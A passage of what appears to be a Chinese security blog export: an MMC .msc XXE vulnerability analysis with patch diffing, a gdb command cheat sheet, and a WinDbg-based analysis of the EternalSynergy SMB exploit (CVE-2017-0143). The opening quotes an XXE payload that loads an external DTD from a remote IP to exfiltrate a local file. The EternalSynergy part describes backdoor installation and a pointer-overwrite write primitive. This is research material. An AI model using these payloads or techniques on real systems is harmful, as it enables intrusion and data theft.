\"\\Windows\\msdfmap.ini\"&gt;..&lt;!ENTITY\"03534d7c \" % dtd SYSTEM \"http://10.8.57.15\"03534dbc \"6:6000/payload.dtd\"&gt;..%dtd;]&gt;..&lt;\"03534dfc \"pwn&gt;&amp;send;&lt;/pwn&gt;..\" 之后最终调用的是XMLParser::LoadEntity 之后是XMLParser::PushURL再到URLStream::Open 先检测一下是不是file类型的url（准确点应该是检测file协议的） URLStream::OpenURL到urlmon!CUrlMon::BindToStorage到urlmon!CUrlMon::StartBinding到urlmon!CBinding::StartBinding再到urlmon!CTransaction::StartEx 到urlmon!COInetProt::StartEx到urlmon!CTransaction::CompleteOperation，最后在CompleteOperation真正发出请求 漏洞修补通过对比修补后的程序 修改的位置在CXMLDocument::ScCoCreate 在我们之前的堆栈中是看不到这个函数的（下面为未修补的程序的堆栈情况） 1234567891011121314151617181920210:000&gt; kvChildEBP RetAddr Args to Child 0006f3dc 6b7b48ca af5c2d94 00000000 034f3ad0 msxml3!Document::run (FPO: [Non-Fpo])0006f418 6b7e4ed4 00000000 00000000 00000000 msxml3!Document::_load+0x185 (FPO: [Non-Fpo])0006f460 6b7e4e50 001c3418 af5c2d18 00000000 msxml3!Document::load+0x3b (FPO: [Non-Fpo])*** WARNING: Unable to verify checksum for mmc.exe0006f494 0102e9fd 001cf3ba 001c3418 ac5412c5 msxml3!Document::Load+0x3c (FPO: [Non-Fpo])0006f4f8 0102dd5f 0006f52c 001c3418 00000001 mmc!CXMLDocument::ScLoad+0x109 (FPO: [Non-Fpo])0006f57c 0103e606 0006f5e4 0006f5f8 00830014 mmc!CConsoleFilePersistor::ScLoadXMLDocumentFromFile+0x174 (FPO: [Non-Fpo])0006f668 01059eeb 0006f6b8 0006fbdc 0006f6f5 mmc!CConsoleFilePersistor::ScLoadConsole+0x15d (FPO: [Non-Fpo])0006f704 01022073 0006f724 0006fbdc ac54116d mmc!CAMCDoc::ScOnOpenDocument+0x1ee (FPO: [Non-Fpo])0006f750 010210b8 0006fbdc ac541199 00000004 mmc!CAMCDoc::OnOpenDocument+0x39 (FPO: [Non-Fpo])0006f7a4 697c2d8e 0006fbdc 00000001 0006fe2c mmc!CAMCMultiDocTemplate::OpenDocumentFile+0x244 (FPO: [Non-Fpo])0006fde8 697c1666 00026c38 ac57af04 00e10b58 MFC42u!CDocManager::OpenDocumentFile+0x1ed (FPO: [Non-Fpo])0006fe10 01020429 0006fe2c ac5418dd 010f54b0 MFC42u!CWinApp::ProcessShellCommand+0x8e (FPO: [Non-Fpo])0006fee0 697bf84c 010f561c 00000001 00000000 mmc!CAMCApp::InitInstance+0x5ca (FPO: [Non-Fpo])0006fef4 0100c107 01000000 00000000 00161b22 MFC42u!AfxWinMain+0x4f (FPO: [Non-Fpo])0006ff88 762e1174 7ffdf000 0006ffd4 7757b3f5 mmc!_initterm_e+0x1b1 (FPO: [Non-Fpo])0006ff94 7757b3f5 7ffdf000 775c0baf 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])0006ffd4 7757b3c8 0103fb0e 7ffdf000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])0006ffec 00000000 0103fb0e 7ffdf000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 我调试修补后的程序，发现ScCoCreate之后就退出mmc了，而没有去调用mmc!CConsoleFilePersistor::ScLoadXMLDocumentFromFile了 12345678910111213141516171819200:000&gt; kv............001ff3fc 76ce9fc0 004ead50 00000000 00000001 ole32!ICoCreateInstanceEx+0x403 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\objact\\objact.cxx @ 1339]001ff45c 76ce9f21 004ead50 00000000 00000001 ole32!CComActivator::DoCreateInstance+0xd9 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\objact\\immact.hxx @ 343]001ff480 76ce9eda 004ead50 00000000 00000001 ole32!CoCreateInstanceEx+0x38 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\objact\\actapi.cxx @ 157]001ff4b0 004ead04 004ead50 00000000 00000001 ole32!CoCreateInstance+0x37 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\objact\\actapi.cxx @ 110]001ff570 004f3844 001ff5d0 00000000 496bde43 mmc!CXMLDocument::ScCoCreate+0x95 (FPO: [Non-Fpo])001ff654 0050d327 001ff6a4 001ffbc4 001ff6e1 mmc!CConsoleFilePersistor::ScLoadConsole+0xfe (FPO: [Non-Fpo])001ff6f0 004bfbdc 001ff710 001ffbc4 496bdf2b mmc!CAMCDoc::ScOnOpenDocument+0x1ee (FPO: [Non-Fpo])001ff73c 004bfa69 001ffbc4 496bdf9b 00000004 mmc!CAMCDoc::OnOpenDocument+0x39 (FPO: [Non-Fpo])001ff78c 67d6219b 001ffbc4 00000001 001ffe14 mmc!CAMCMultiDocTemplate::OpenDocumentFile+0x245 (FPO: [Non-Fpo])001ffdd0 67d622df 00026aa0 496a9035 02cfeb50 MFC42u!CDocManager::OpenDocumentFile+0x1ed (FPO: [Non-Fpo])001ffdf8 004bf580 001ffe14 496bd6df 005d2280 MFC42u!CWinApp::ProcessShellCommand+0x8e (FPO: [Non-Fpo])001ffec8 67d5f344 005d24dc 00000001 00000000 mmc!CAMCApp::InitInstance+0x5ca (FPO: [Non-Fpo])001ffedc 004c2e41 00490000 00000000 00341780 MFC42u!AfxWinMain+0x4f (FPO: [Non-Fpo])001fff70 7588d0e9 7ffd7000 001fffbc 770019bb mmc!_initterm_e+0x1b1 (FPO: [Non-Fpo])001fff7c 770019bb 7ffd7000 773e7a98 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])001fffbc 7700198e 004e2ed1 7ffd7000 ffffffff ntdll!__RtlUserThreadStart+0x23 (FPO: [Non-Fpo])001fffd4 00000000 004e2ed1 7ffd7000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 所以判断是在ScCoCreate里面 可以看到如果不满足条件就直接退出了 而且在ida也明显看到了ProhibitDTD，禁止dtd文件 整个执行路径如下两图 所以微软修补方法是：在ScCoCreate函数里面判断，禁止dtd文件 漏洞检测直接阻止含ENTITY外部实体声明的msc文件","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"}]},{"title":"gdb命令总结","slug":"gdb命令总结","date":"2017-09-18T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/09/18/gdb命令总结/","link":"","permalink":"https://www.giantbranch.cn/2017/09/18/gdb命令总结/","excerpt":"","text":"help + 命令就可以查看这个命令的详细帮助信息 查看信息info我用过的 info share ： info sharedlibrary 查看加载了什么库，地址好像不准，maps文件的才准（其实直接输入sharedlibrary命令就行了，不过没有地址而已，不过那个地址也不准的样子） i b :查看断点 i r ：查看寄存器， i r eax edx：只查看eax和edx 官方文档： info address -- Describe where symbol SYM is storedinfo all-registers -- List of all registers and their contentsinfo args -- Argument variables of current stack frameinfo auxv -- Display the inferior&#39;s auxiliary vectorinfo breakpoints -- Status of user-settable breakpointsinfo catch -- Exceptions that can be caught in the current stack frameinfo checkpoints -- IDs of currently known checkpointsinfo classes -- All Objective-C classesinfo common -- Print out the values contained in a Fortran COMMON blockinfo copying -- Conditions for redistributing copies of GDBinfo dcache -- Print information on the dcache performanceinfo display -- Expressions to display when program stopsinfo extensions -- All filename extensions associated with a source languageinfo files -- Names of targets and files being debuggedinfo float -- Print the status of the floating point unitinfo frame -- All about selected stack frameinfo functions -- All function namesinfo handle -- What debugger does when program gets various signalsinfo inferiors -- IDs of currently known inferiorsinfo line -- Core addresses of the code for a source lineinfo locals -- Local variables of current stack frameinfo macro -- Show the definition of MACROinfo mem -- Memory region attributesinfo os -- Show OS data ARGinfo proc -- Show /proc process information about any running processinfo program -- Execution status of the programinfo record -- Info record optionsinfo registers -- List of integer registers and their contentsinfo scope -- List the variables local to a scopeinfo selectors -- All Objective-C selectorsinfo set -- Show all GDB settingsinfo sharedlibrary -- Status of loaded shared object librariesinfo signals -- What debugger does when program gets various signalsinfo source -- Information about the current source fileinfo sources -- Source files in the programinfo stack -- Backtrace of the stackinfo symbol -- Describe what symbol is at location ADDRinfo target -- Names of targets and files being debuggedinfo tasks -- Provide information about all known Ada tasksinfo terminal -- Print inferior&#39;s saved terminal statusinfo threads -- IDs of currently known threadsinfo tracepoints -- Status of tracepointsinfo types -- All type namesinfo variables -- All global and static variable namesinfo vector -- Print the status of the vector unitinfo warranty -- Various kinds of warranty you do not haveinfo watchpoints -- Synonym for ``info breakpoints&#39;&#39;info win -- List of all displayed windows xx /50x 0xxxxxx x /5i 0xxxxxx 12345678Examine memory: x/FMT ADDRESS.ADDRESS is an expression for the memory address to examine.FMT is a repeat count followed by a format letter and a size letter.Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char) and s(string).Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).The specified number of objects of the specified size are printedaccording to the format. print打印寄存器的值：print $eax 打印符号，如下 12print main$2 = &#123;int (int, char , char )&#125; 0x8049ab9 &lt;main&gt; 查看栈backtrace – Print backtrace of all stack frames（查看函数调用栈）[bt full显示的信息更加详细，其实就多显示了当前函数的局部变量] frame默认跟上面显示的没什么差别 up显示上层函数的调用，不过好像只能看一层 where 好像显示所有调用栈 调试调试core文件(ulimit -c unlimited开启不限制core文件大小，因为默认是0) core文件没设置的话应该默认在当前目录 gdb 程序名 core文件路径 或者 gdb 程序名 –core core文件路径 调试命令r 运行 c 继续运行，直到碰到断点或异常才会停止 ni 单步 si 步入 jump 跳到那里执行 start – Run the debugged program until the beginning of the main procedure set follow-fork-mode child 跟随fork出来的子进程 更多请查看文档 help running 断点普通断点b *0x88888888 b main b *0x666666 if $rdi==0x666 删除断点 d 序号（那个是 i b的序号） “硬件断点” watch 0x66666666 还有 rwatch，awatch 设置成intel格式的汇编1set disassembly-flavor intel 其他add-symbol-file 加载符号文件 shell ：可临时切换到shell，exit就可以回到gdb了 新发现的东西checkpoints可以新启动一个进程，运行到当前位置 info checkpoints 可以查看 restart 序号就可以切换了 最近发现的超好用的——202009条件记录断点类似windbg的条件记录断点效果 下了断点后，使用command命令，加上断点的序号即可，之后就可以输入命令了，最后以end结尾就行 1command &lt;breakpoint_Num&gt; 123456789101112gdb-peda$ blNum Type Disp Enb Address What2 breakpoint keep y 0x0000000000402a00 3 breakpoint keep y 0x0000000000402a0a gdb-peda$ commands 3Type commands for breakpoint(s) 3, one per line.End with a line saying just &quot;end&quot;.&gt;echo rdx=&gt;print $rdx&gt;x /20gx 0x620000&gt;endgdb-peda$ 给原有断点加上条件这个是不用加if了 1condition &lt;breakpoint_Num&gt; 条件 例子 1condition 2 $rdx==1 执行多个指令，跳过多次断点1234# 执行num个指令ni &lt;num&gt;# 跳过num个断点c &lt;num&gt; pwndbg插件那些很少被人用的功能 vis_heap_chunks，可视化查看chunks 1vis_heap_chunks &lt;个数(可选)&gt; &lt;起始地址(可选)&gt;","categories":[],"tags":[{"name":"gdb命令","slug":"gdb命令","permalink":"https://www.giantbranch.cn/tags/gdb命令/"}]},{"title":"Eternalsynergy利用的漏洞分析（CVE-2017-0143）","slug":"Eternalsynergy利用的漏洞分析（CVE-2017-0143）","date":"2017-08-31T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/","link":"","permalink":"https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/","excerpt":"","text":"环境搭建 把防火墙关闭了就好 安装域控 实验环境及工具如下： server 2012 sp0 datacenter （装了域控，不是r2版本啊）windbgVirtualKD-3.0wireshark 工具利用复现首先第一次探测的时候做了如下事情： 获取目标系统版本信息 尝试可以访问的管道 探测目标系统的架构（32位还是64位） 还会输出可以利用什么工具，那几个工具的检测代码应该是类似的 接下来开始漏洞利用，先生成shellcode 之后设置为上面生成shellcode的位置 最后即可安装后门 用Doublepulsar检测一下，确实成功了 根据输出信息，我们可以看到利用步骤如下： 利用信息泄露：先找到CONNECTION结构体，之后找到SRV全局指针，最后就找到了 Transaction2Dispatch tables的位置 查找可执行的内存 复制backdoor shellcode到上面找到的内存 触发stub分配器，覆盖backdoor函数指针 触发 DOUBLEPULSAR的安装 初步漏洞分析我将shellcode前面都改为CC，跟着windbg就乖乖断下来了，刚好断在shellcode起始位置 1234567891011121314151617kd&gt; gBreak instruction exception - code 80000003 (first chance)fffffa80`18e2e016 cc int 3kd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`0580e950 fffffa80`18e2e015 : fffff880`050486cf 00000000`00000005 fffffa80`1dd37a10 00000000`00000000 : 0xfffffa80`18e2e016fffff880`0580e958 fffff880`050486cf : 00000000`00000005 fffffa80`1dd37a10 00000000`00000000 fffffa80`1a833470 : 0xfffffa80`18e2e015fffff880`0580e960 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!ExecuteTransaction+0x2cfkd&gt; dc eipfffffa80`18e2e016 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e026 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e036 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e046 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e056 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e066 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e076 cccccccc cccccccc cccccccc cccccccc ................fffffa80`18e2e086 cccccccc cccccccc cccccccc cccccccc ................ 那bp srv!ExecuteTransaction看看什么情况 第一个包就暂停下来了，应该很多包都会暂停，那先不管 1234567891011121314kd&gt; gBreakpoint 0 hitsrv!ExecuteTransaction:fffff880`05048400 48895c2408 mov qword ptr [rsp+8],rbxkd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`04d2c9c8 fffff880`0504e041 : 00000000`00000001 fffff880`04d2ca49 fffffa80`1e2fa470 fffff8a0`0280a10c : srv!ExecuteTransactionfffff880`04d2c9d0 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`000010c0 fffff880`00000004 : srv!SrvSmbNtTransaction+0x6a9fffff880`04d2cab0 fffff880`05003607 : fffffa80`1e2f9010 fffffa80`1d4d2b90 fffffa80`1e2f9a90 fffff880`0501a158 : srv!SrvProcessSmb+0x230fffff880`04d2cb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1e2f9010 00000000`00000000 fffffa80`1e2f9020 : srv!SrvRestartReceive+0x10ffffff880`04d2cb60 fffff800`1afb1e3e : fffff8a0`026c70d0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42effffff880`04d2cbe0 fffff800`1ac40521 : fffffa80`1dd8c400 fffff8a0`026c70d0 fffffa80`1a537218 fffff880`01c028b0 : nt!IopThreadStart+0x26fffff880`04d2cc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`1dd8c400 fffffa80`1cb23b00 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59fffff880`04d2cc60 00000000`00000000 : fffff880`04d2d000 fffff880`04d27000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16 先看看ida看看srv!ExecuteTransaction+0x2cf前一个指令是什么原来是SrvTransaction2DispatchTable里面的函数 1PAGE:00000000000586C8 call rva SrvTransaction2DispatchTable[rdx+rax*8] 这样我就可以大胆推测，应该是改写了这个函数table里面的值 下面为table里面的函数列表 12345678910111213141516171819data:000000000002A920 SrvTransaction2DispatchTable dq offset SrvSmbOpen2.data:000000000002A920 ; DATA XREF: ExecuteTransaction+2C8r.data:000000000002A928 dq offset SrvSmbFindFirst2.data:000000000002A930 dq offset SrvSmbFindNext2.data:000000000002A938 dq offset SrvSmbQueryFsInformation.data:000000000002A940 dq offset SrvSmbSetFsInformation.data:000000000002A948 dq offset SrvSmbQueryPathInformation.data:000000000002A950 dq offset SrvSmbSetPathInformation.data:000000000002A958 dq offset SrvSmbQueryFileInformation.data:000000000002A960 dq offset SrvSmbSetFileInformation.data:000000000002A968 dq offset SrvSmbFindNotify.data:000000000002A970 dq offset SrvSmbIoctl2.data:000000000002A978 dq offset SrvSmbFindNotify.data:000000000002A980 dq offset SrvSmbFindNotify.data:000000000002A988 dq offset SrvSmbCreateDirectory2.data:000000000002A990 dq offset SrvTransactionNotImplemented.data:000000000002A998 dq offset SrvTransactionNotImplemented.data:000000000002A9A0 dq offset SrvSmbGetDfsReferral.data:000000000002A9A8 dq offset SrvSmbReportDfsInconsistency 我们对bp srv!ExecuteTransaction+0x2c8，即 call rva SrvTransaction2DispatchTable[rdx+rax*8]下断，执行几次我们就到达了调用shellcode处，可以看到.data:000000000002A990 dq offset SrvTransactionNotImplemented被覆盖掉了，我们可以在这里下断看看是什么时候被写入的 12345678910111213141516171819kd&gt; dqs SrvTransaction2DispatchTable l12fffff880`0501a920 fffff880`05078240 srv!SrvSmbOpen2fffff880`0501a928 fffff880`050542fc srv!SrvSmbFindFirst2fffff880`0501a930 fffff880`05074dcc srv!SrvSmbFindNext2fffff880`0501a938 fffff880`05057c18 srv!SrvSmbQueryFsInformationfffff880`0501a940 fffff880`0507708c srv!SrvSmbSetFsInformationfffff880`0501a948 fffff880`05056bc0 srv!SrvSmbQueryPathInformationfffff880`0501a950 fffff880`05071140 srv!SrvSmbSetPathInformationfffff880`0501a958 fffff880`0504be70 srv!SrvSmbQueryFileInformationfffff880`0501a960 fffff880`0505a000 srv!SrvSmbSetFileInformationfffff880`0501a968 fffff880`0507745c srv!SrvSmbFsctlfffff880`0501a970 fffff880`05075370 srv!SrvSmbIoctl2fffff880`0501a978 fffff880`0507745c srv!SrvSmbFsctlfffff880`0501a980 fffff880`0507745c srv!SrvSmbFsctlfffff880`0501a988 fffff880`050730d8 srv!SrvSmbCreateDirectory2fffff880`0501a990 fffffa80`18e2d010fffff880`0501a998 fffff880`050796e8 srv!SrvTransactionNotImplementedfffff880`0501a9a0 fffff880`05069160 srv!SrvSmbGetDfsReferralfffff880`0501a9a8 fffff880`05068dc4 srv!SrvSmbReportDfsInconsistency 结果发现是SrvSmbTransactionSecondary时调用了memmove 12345678kd&gt; gBreakpoint 0 hitsrv!memmove+0x2f:fffff880`0500186f 75ef jne srv!memmove+0x20 (fffff880`05001860)kd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`058d1a18 fffff880`0507e384 : fffffa80`1e325470 fffffa80`1e324010 fffffa80`1e325450 00000000`00000001 : srv!memmove+0x2ffffff880`058d1a20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!SrvSmbTransactionSecondary+0x2d4 是在下面这里 那么就是利用这里进行任意地址的写操作，到这了没什么思路，到底具体是什么原因导致这里任意地址写呢 我们从最开始分析吧 判断系统位数通过发送bind，看看收到的bind ack那里来确定系统位数 也可以看到攻击端是32位的 信息泄露数据包体现 发了好多Trans Request，MID是递增的，所以应该在内存构建了多个相邻的transaction 获取到了CONNECTION结构的地址后就用这地址去发送Request，这里的数据包是嵌套了很多smb数据，其中我们的CONNECTION struct: 0xFFFFFA801D4D3B90 是在第3个smb里面（不算第一个的话） 收到SRV global data pointer 发了很多尝试包，都是两个两个发的，下面这个是泄露那个table的最后一个包 收到这个包就确定了table的地址，应该是根据这个table前面有很多0xfe，还有table中后面两个函数指针是保留指针，所以地址是一样的，猜测是这样判断的 6.最后就是判断读写执行的内存的返回包，其实后来调试他是在寻找nt!KxUnexpectedInterrupt0，这个地址就是RWX地址 信息泄露原理原理简述这里面用了两种信息泄露的点 发送nt rename包，在RestartTransactionResponse的时候利用下面的这一句覆盖另一个transaction的OutData指针，这个用于泄露CONNECTION地址 1memmove(pNtRenameParameters, (const void *)(*(_QWORD *)(transaction + 0x88) + dataDisplacement), DataCount);// 0x88偏移为out Data 第二种是利用SrvSmbTransactionSecondary下面这句，泄露其他地址 1234memmove( (void *)(*(_QWORD *)(v8 + 0x80) + DataDisplacementCopy),// 0x80偏移是InData指针 (const void *)(smbTotalDataCopy + DataoffsetCopy), DataCount); 其实我觉得别的文章说的类型混淆，可能找transaction的时候找到的是WriteAndX的，实际上更重要的是dataDisplacement的偏移，而且数据包中很多利用的MID都是0，应该只有两次是利用了WriteAndX同样的MID 既然可以覆盖OutData指针，那么也可以覆盖InData指针，就可以达到任意地址写的目的了 通过SrvFindTransaction看信息泄露下断点 bp SrvFindTransaction+0xbb &quot;r r15;dq rsi+0xc0;gc&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546.......r15=0000000000000000fffff8a0`02b65330 00000000`000087f4 00000000`00000000fffff8a0`02b65340 00000000`00000000 00000000`00000000fffff8a0`02b65350 00000000`00010101 00000000`00000000fffff8a0`02b65360 00000000`00000000 00000000`00000000fffff8a0`02b65370 00000000`00000000 00000000`00000000fffff8a0`02b65380 00000000`00000000 00000000`00000000fffff8a0`02b65390 00000000`00000000 00000000`00000000fffff8a0`02b653a0 00000000`00000000 00000000`00000000r15=0000000000000000fffff8a0`02b8b330 00000000`000087f5 00000000`00000000fffff8a0`02b8b340 00000000`00000000 00000000`00000000fffff8a0`02b8b350 00000000`00010101 00000000`00000000fffff8a0`02b8b360 00000000`00000000 00000000`00000000fffff8a0`02b8b370 00000000`00000000 00000000`00000000fffff8a0`02b8b380 00000000`00000000 00000000`00000000fffff8a0`02b8b390 00000000`00000000 00000000`00000000fffff8a0`02b8b3a0 00000000`00000000 00000000`00000000r15=0000000000000000fffff8a0`02ba1330 00000000`00000000 00000000`00000000fffff8a0`02ba1340 00000000`00000000 00000000`00000000fffff8a0`02ba1350 00000000`00010101 00000000`00000000fffff8a0`02ba1360 00000000`00000000 00000000`00000000fffff8a0`02ba1370 00000000`00000000 00000000`00000000fffff8a0`02ba1380 00000000`00000000 00000000`00000000fffff8a0`02ba1390 00000000`00000000 00000000`00000000fffff8a0`02ba13a0 00000000`00000000 00000000`00000000kd&gt; dq fffff8a0`02ba1330-0xc0fffff8a0`02ba1270 00000000`0d8c020c fffffa80`1e25e810fffff8a0`02ba1280 fffffa80`1d4d5910 fffff8a0`02d41750fffff8a0`02ba1290 fffff8a0`01c20dd0 fffff8a0`02bd0298fffff8a0`02ba12a0 fffff8a0`02b8b298 00000000`00000000fffff8a0`02ba12b0 00000000`00020000 fffff8a0`02ba1368fffff8a0`02ba12c0 00000001`0004a0b5 00000000`00000000fffff8a0`02ba12d0 fffff8a0`02ba136c 00000000`00000000fffff8a0`02ba12e0 fffff8a0`02ba136c fffff8a0`02ba13ackd&gt; dq fffff8a0`02ba1330-0xc0+0x80fffff8a0`02ba12f0 fffff8a0`02b4e170 fffff8a0`02ba1ffcfffff8a0`02ba1300 00000000`00000000 00000000`00000000fffff8a0`02ba1310 00000004`00000c50 00000000`00001000fffff8a0`02ba1320 00000101`00000000 08032155`08030000fffff8a0`02ba1330 00000000`00000000 00000000`00000000fffff8a0`02ba1340 00000000`00000000 00000000`00000000fffff8a0`02ba1350 00000000`00010101 00000000`00000000fffff8a0`02ba1360 00000000`00000000 00000000`00000000 那么可以看到 fffff8a002b4e170+ 0x88 = fffff8a002b4e1f8 这个地址就是被利用的地址（即fffff8a002ba1270地址这个transaction的InData指针的加一个偏移后，覆盖了另一个transaction的OutData指针，从而达到信息泄露的目的），0x88为Data Displacement 泄露CONNECTION地址在这一句已经开始发送泄露的数据包，去泄露CONNECTION的地址 数据包如下：（可以看到是NT RENAME的trans数据包） 处理第一个包接下来就会进入srv!SrvSmbNtRename函数 123456789101112131415kd&gt; gBreakpoint 1 hitsrv!SrvSmbNtRename:fffff880`05073818 48895c2410 mov qword ptr [rsp+10h],rbxkd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`0337f978 fffff880`05048801 : fffff800`00000005 fffff880`0337fa49 00000000`00000002 fffff880`050018ef : srv!SrvSmbNtRenamefffff880`0337f980 fffff880`0504e041 : 00000000`00000001 fffff880`0337fa49 fffffa80`1d495240 fffff8a0`02c4210c : srv!ExecuteTransaction+0x401fffff880`0337f9d0 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`000010c0 fffff880`00000004 : srv!SrvSmbNtTransaction+0x6a9fffff880`0337fab0 fffff880`05003607 : fffffa80`1d49a750 fffffa80`1d4d4b90 fffffa80`1d49b1d0 fffff880`0501a158 : srv!SrvProcessSmb+0x230fffff880`0337fb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1d49a750 00000000`00000000 fffffa80`1d49a760 : srv!SrvRestartReceive+0x10ffffff880`0337fb60 fffff800`1afb1e3e : fffff8a0`017ab0a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42effffff880`0337fbe0 fffff800`1ac40521 : fffffa80`18d49040 fffff8a0`017ab0a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26fffff880`0337fc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`18d49040 fffffa80`1d48e040 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59fffff880`0337fc60 00000000`00000000 : fffff880`03380000 fffff880`0337a000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x1 这函数是从工具程序和数据包联合启发而找到的 SrvSmbNtRename函数在SrvNtTransactionDispatchTable中，通过偏移调用实现的 接下来我们动态跟踪 里面对FID进行Verify 返回值为0xfffffa801dfb39d0（那是某一次调试记录），之后函数就返回了 整个流程如下 出来后进入这个 跟数据包中下面这个是相关的 最后在SrvCompleteExecuteTransaction调用SrvStartSend返回smb数据包 123456789101112131415161718kd&gt; psrv!ExecuteTransaction+0x7a9:fffff880`05048ba9 e832000000 call srv!SrvCompleteExecuteTransaction (fffff880`05048be0)kd&gt; bp SrvStartSend2kd&gt; bp SrvStartSendkd&gt; gBreakpoint 5 hitsrv!SrvStartSend:fffff880`0500dd20 48895c2408 mov qword ptr [rsp+8],rbxkd&gt; dc poi(rcx+0xc0) fffffa80`1d495220 424d53ff 000000a0 c0039800 00000000 .SMB............fffffa80`1d495230 00000000 00000000 8d790800 fb910800 ..........y.....fffffa80`1d495240 00000012 00000004 000010c0 00000004 ................fffffa80`1d495250 00000048 00000000 000010b8 0000004c H...........L...fffffa80`1d495260 00000000 0010bd00 77c04000 068450ca .........@.w.P..fffffa80`1d495270 0b13c8fb 6db02c36 ef97c0ff 2550ed2b ....6,.m....+.P%fffffa80`1d495280 c0a10aee 5572a1c6 125825c1 654704c3 ......rU.%X...Gefffffa80`1d495290 f05286d3 fbd127f2 14eb5b49 ab2613ad ..R..&apos;..I[....&amp;. 还有一个问题没弄明白的就是rename的数据到底有什么用，暂时猜测只是填充 处理第二个包secondary包由于是Nt trans 的包，所以调用的是srv!SrvSmbNtTransactionSecondary 12345678910111213kd&gt; gBreakpoint 3 hitsrv!SrvSmbNtTransactionSecondary:fffff880`0507db34 fff3 push rbxkd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`0337faa8 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`19b36010 fffff880`05007f5a : srv!SrvSmbNtTransactionSecondaryfffff880`0337fab0 fffff880`05003607 : fffffa80`1d499360 fffffa80`1d4d4b90 fffffa80`1d499de0 fffff880`0501a158 : srv!SrvProcessSmb+0x230fffff880`0337fb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1d499360 00000000`00000000 fffffa80`1d499370 : srv!SrvRestartReceive+0x10ffffff880`0337fb60 fffff800`1afb1e3e : fffff8a0`017ab0a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42effffff880`0337fbe0 fffff800`1ac40521 : fffffa80`18d49040 fffff8a0`017ab0a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26fffff880`0337fc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`18d49040 fffffa80`1d48e040 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59fffff880`0337fc60 00000000`00000000 : fffff880`03380000 fffff880`0337a000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16 在下面这条赋值中发现上面截图中数据包中的数据 123456789101112kd&gt; psrv!SrvSmbNtTransactionSecondary+0x18:fffff880`0507db4c 488b99c8000000 mov rbx,qword ptr [rcx+0C8h]kd&gt; db poi(rcx+0C8)+28fffffa80`1d4910d8 ca 50 84 06 fb c8 13 0b-36 2c b0 6d ff c0 97 ef .P......6,.m....fffffa80`1d4910e8 2b ed 50 25 ee 0a a1 c0-c6 a1 72 55 c1 25 58 12 +.P%......rU.%X.fffffa80`1d4910f8 c3 04 47 65 d3 86 52 f0-f2 27 d1 fb 49 5b eb 14 ..Ge..R..&apos;..I[..fffffa80`1d491108 ad 13 26 ab db 9d db c7-2c fa a3 19 b9 04 10 ca ..&amp;.....,.......fffffa80`1d491118 0d 94 74 59 db 8b 6f 59-ae 27 a6 d6 92 5f 53 82 ..tY..oY.&apos;..._S.fffffa80`1d491128 4c b1 bf b8 61 53 7d 15-ca 91 e3 59 36 7c 0d 23 L...aS&#125;....Y6|.#fffffa80`1d491138 aa 0a 7f f6 4e b4 9c 90-bd af c8 14 18 eb 79 e2 ....N.........y.fffffa80`1d491148 3f af f0 48 55 14 c1 83-da ca 34 61 6c 05 1f 19 ?..HU.....4al... 下面调用SrvFindTransaction，找到了，返回了0xfffff8a002c42010 